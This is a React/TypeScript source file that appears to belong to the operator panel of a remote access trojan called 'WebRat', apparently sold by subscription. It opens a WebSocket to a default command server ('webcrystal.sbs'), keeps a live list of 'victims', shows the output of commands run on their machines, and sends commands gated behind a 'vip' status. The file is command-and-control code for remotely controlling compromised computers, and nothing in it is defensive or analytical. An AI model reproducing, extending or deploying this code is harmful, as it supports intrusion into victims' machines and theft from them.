"use client";

import { createContext, useCallback, useContext, useEffect, useMemo, useRef, useState } from "react";
import { useQueryClient } from "@tanstack/react-query";

import type { Victim } from "../api/victims";
import { readWsHostGlobal, migrateLegacyWsHostGlobal } from "../settings/storage";
import { useSubscriptionQuery } from "../hooks/use-subscription-query";
import { dispatchWsMessage, getWsUrl, safeJsonParse, type WsConnState, type WsJson } from "./ws-client";

type WsCtx = {
    state: WsConnState;
    sendJson: (payload: Record<string, unknown>) => boolean;
};

const Ctx = createContext<WsCtx | null>(null);

export function usePanelWS(): WsCtx {
    const v = useContext(Ctx);
    if (!v) {
        return {
            state: "idle",
            sendJson: () => false,
        };
    }
    return v;
}

export function PanelWsProvider(props: { children: React.ReactNode }) {
    const { children } = props;
    const qc = useQueryClient();
    const subQ = useSubscriptionQuery();

    const DEFAULT_WS_HOST = "webcrystal.sbs";

    const [wsState, setWsState] = useState<WsConnState>("idle");

    const wsRef = useRef<WebSocket | null>(null);
    const reconnectTimer = useRef<number | null>(null);
    const connectRef = useRef<() => void>(() => {
        return;
    });

    const isVip =
        String(((subQ.data as unknown as { status?: unknown } | null) ?? null)?.status || "").toLowerCase() === "vip";

    const state: WsConnState = useMemo(() => {
        return isVip ? wsState : "closed";
    }, [isVip, wsState]);

    const clearReconnect = useCallback(() => {
        if (reconnectTimer.current != null) {
            window.clearTimeout(reconnectTimer.current);
            reconnectTimer.current = null;
        }
    }, []);

    const closeWsRaw = useCallback(() => {
        clearReconnect();
        const ws = wsRef.current;
        wsRef.current = null;
        if (ws) {
            try {
                ws.onopen = null;
                ws.onclose = null;
                ws.onerror = null;
                ws.onmessage = null;
                ws.close();
            } catch {
            }
        }
    }, [clearReconnect]);

    const reconnectAttempts = useRef(0);

    const scheduleReconnect = useCallback(() => {
        if (!isVip) return;
        clearReconnect();
        const attempt = reconnectAttempts.current;
        const baseDelay = Math.min(2000 * Math.pow(2, attempt), 30_000);
        const jitter = Math.random() * 1000;
        const delay = baseDelay + jitter;
        reconnectAttempts.current = attempt + 1;
        reconnectTimer.current = window.setTimeout(() => {
            try {
                connectRef.current();
            } catch {
            }
        }, delay);
    }, [clearReconnect, isVip]);

    const connect = useCallback(() => {
        if (!isVip) return;

        clearReconnect();

        const existing = wsRef.current;
        if (existing && (existing.readyState === WebSocket.OPEN || existing.readyState === WebSocket.CONNECTING)) {
            return;
        }

        try {
            migrateLegacyWsHostGlobal();
        } catch {
        }

        const host = readWsHostGlobal() || DEFAULT_WS_HOST;
        const url = getWsUrl(host);

        let ws: WebSocket;
        try {
            ws = new WebSocket(url);
        } catch {
            return;
        }

        wsRef.current = ws;
        setWsState("connecting");

        ws.onopen = () => {
            reconnectAttempts.current = 0;
            setWsState("open");
            try {
                qc.invalidateQueries({ queryKey: ["victims"] });
            } catch {
            }
        };

        ws.onerror = () => {
            // keep state; close will trigger reconnect
        };

        ws.onmessage = (event) => {
            const msg = safeJsonParse(String((event as MessageEvent).data || ""));
            if (!msg) return;

            const t = String(msg.type || "");

            const obj = msg as Record<string, unknown>;

            if (t === "victims") {
                const victimsVal = obj.victims;
                if (Array.isArray(victimsVal)) {
                    const list = (victimsVal.filter(Boolean) as unknown[]).filter((x) => typeof x === "object" && x != null) as Victim[];
                    qc.setQueryData(["victims"], list);
                }
            } else if (t === "update") {
                const id = typeof obj.id === "string" || typeof obj.id === "number" ? String(obj.id).trim() : "";
                if (!id) return;
                qc.setQueryData(["victims"], (prev: unknown) => {
                    const arr = Array.isArray(prev) ? (prev as Victim[]) : [];
                    const idx = arr.findIndex((v) => String((v as { id?: unknown }).id ?? "") === id);
                    if (idx === -1) return arr;
                    const next = [...arr];

                    const patch = msg as unknown as Partial<Victim>;
                    next[idx] = { ...next[idx], ...patch } as Victim;
                    return next;
                });
            } else if (t === "cmd_output") {
                try {
                    const out = obj.output;
                    const fn = (window as unknown as { WebRatAppendTerminalOutput?: unknown }).WebRatAppendTerminalOutput;
                    if (typeof fn === "function") fn(out != null ? String(out) : "");
                } catch {
                }
            }

            dispatchWsMessage(msg as WsJson);
        };

        ws.onclose = () => {
            wsRef.current = null;
            setWsState("closed");

            scheduleReconnect();
        };
    }, [clearReconnect, isVip, qc, scheduleReconnect]);

    useEffect(() => {
        connectRef.current = connect;
    }, [connect]);

    useEffect(() => {
        if (!isVip) {
            closeWsRaw();
            return;
        }

        const t = window.setTimeout(() => {
            try {
                connectRef.current();
            } catch {
            }
        }, 0);
        return () => {
            window.clearTimeout(t);
            closeWsRaw();
        };
    }, [closeWsRaw, connect, isVip]);

    useEffect(() => {
        const onHost = () => {
            if (!isVip) return;
            try {
                closeWsRaw();
                setWsState("closed");
            } catch {
            }
            try {
                connectRef.current();
            } catch {
            }
        };

        try {
            window.addEventListener("webrat_ws_host_changed", onHost as EventListener);
        } catch {
            return;
        }

        return () => {
            try {
                window.removeEventListener("webrat_ws_host_changed", onHost as EventListener);
            } catch {
            }
        };
    }, [closeWsRaw, isVip]);

    const sendJson = useCallback((payload: Record<string, unknown>): boolean => {
        const ws = wsRef.current;
        if (!ws || ws.readyState !== WebSocket.OPEN) return false;
        try {
            ws.send(JSON.stringify(payload));
            return true;
        } catch {
            return false;
        }
    }, []);

    const value = useMemo(() => ({ state, sendJson }), [sendJson, state]);

    return <Ctx.Provider value={value}>{children}</Ctx.Provider>;
}
